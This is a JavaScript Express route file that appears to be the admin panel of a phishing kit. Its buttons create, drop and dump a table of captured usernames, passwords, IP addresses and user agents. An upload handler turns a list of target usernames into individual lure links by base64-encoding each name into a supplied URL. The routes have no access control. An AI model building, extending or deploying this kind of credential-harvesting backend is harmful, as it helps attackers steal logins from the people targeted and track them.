const express = require('express');
const router = express.Router()
const fs = require('fs');
const db = require('../db');
const multer = require('multer');




router.get("/", function(req, res,){

    res.render('index',{ message: '' });
});


// Handle Requests from Page

router.post('/', (req, res) => {
  const { create, delete:newdel, getdata, genurl } = req.body;


//Button 1
// Handle the "Create Table" button click 
// Your code for creating a table goes here


        if (create) {
              

              const createTableSQL = `
          CREATE TABLE IF NOT EXISTS notprem (
          id INT AUTO_INCREMENT PRIMARY KEY,
          username VARCHAR(255),
          password VARCHAR(255),
          ip VARCHAR(255) NOT NULL,
          useragent VARCHAR(255) NOT NULL,
          date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )
        `;

        db.query(createTableSQL, (err, result, next) => {
            if (err) {
              console.error('Error creating table:', err);
            } else {
              console.log('Table created successfully');
            }
            });
              
            res.render('index', { message: 'Table Created' }); 


            
//Button 2
// Handle the "Get Data" button click
// Your code for retrieving data goes here
  
            } else if (newdel) {
              const tableName = 'notprem'; // Replace with the name of the table to delete

              // SQL query to delete the table
              const deleteQuery = `DROP TABLE ${tableName}`;
            
              // Execute the query to delete the table
              db.query(deleteQuery, (err, result) => {
                  if (err) {
                      console.error('Error deleting table:', err);
                      return res.status(500).send('Internal Server Error');
                  }
                  res.render('index', { message: 'Table Deleted' }); 
              });

//Button 3
// Handle the "Get Data" button click
// Your code for retrieving Table From database goes here


          } else if (getdata) {
            
              const query = 'SELECT * FROM notprem'; // Replace with your table name
          
            db.query(query, (err, results) => {
              if (err) {
                console.error('Error executing the query: ' + err.stack);
                return res.status(500).send('Error fetching data from the database.');
              }
          // Store the data in a variable
              const data = Object.values(JSON.parse(JSON.stringify(results)));
            
              res.render('table', {data});
          
            });


//Button 4
// Handle the "Gen Url" button click
// Your code for generating url goes here



  } else if (genurl) {
    res.render('upload');
  } else {
      // Handle any other case
      res.send('Unknown action');
  }
});

// Data Handelling at new page
// Access the uploaded file from req.file
// Set up multer to handle file uploads

const storage = multer.memoryStorage(); 


// Store the file in memory
const upload = multer({ storage: storage });

router.post('/upload', upload.single('textFile'), (req, res) => {
  
      const url = req.body.url;
      const key = req.body.key;
      const uploadedFile = req.file;

// Check if a file was uploaded

        if (!uploadedFile) {
            return res.status(400).send('No file uploaded.');
        }

// Ensure the uploaded file is a text/plain file

        if (uploadedFile.mimetype !== 'text/plain') {
            return res.status(400).send('Only text files are allowed.');
        }

// Read the content of the uploaded text file

      const fileContent = uploadedFile.buffer.toString('utf-8');
      const line = fileContent.split('\n');
      const b64user = line.map((str) => Buffer.from(str).toString('base64'));
      const links = b64user.map((str) => `${url}${key}${str}`);  
      res.render('url', { title:'USER LIST WITH URL', line, links });

  
// Display the content in the response or perform other actions
  
  
});

module.exports = router;
